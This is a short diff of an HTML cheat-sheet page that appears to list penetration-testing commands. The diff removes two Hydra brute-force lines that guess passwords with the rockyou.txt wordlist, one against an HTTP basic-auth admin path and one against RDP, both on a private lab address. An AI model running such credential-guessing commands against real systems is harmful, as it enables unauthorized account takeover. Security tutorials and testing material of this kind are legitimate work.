@@ -1,12 +1,5 @@
 
 
-<span class="c"># ── HTTP BASIC AUTH ───────────────────────────────────────</span>
-<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt http-get<span class="op">://</span><span class="val">192.168.1.10/admin</span>
-
-<span class="c"># ── RDP ───────────────────────────────────────────────────</span>
-<span class="cmd">hydra</span> <span class="fl">-l</span> administrator <span class="fl">-P</span> rockyou.txt rdp<span class="op">://</span><span class="val">192.168.1.10</span></pre>
-    </div>
-
     <div class="code-block">
       <div class="code-header">
         <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
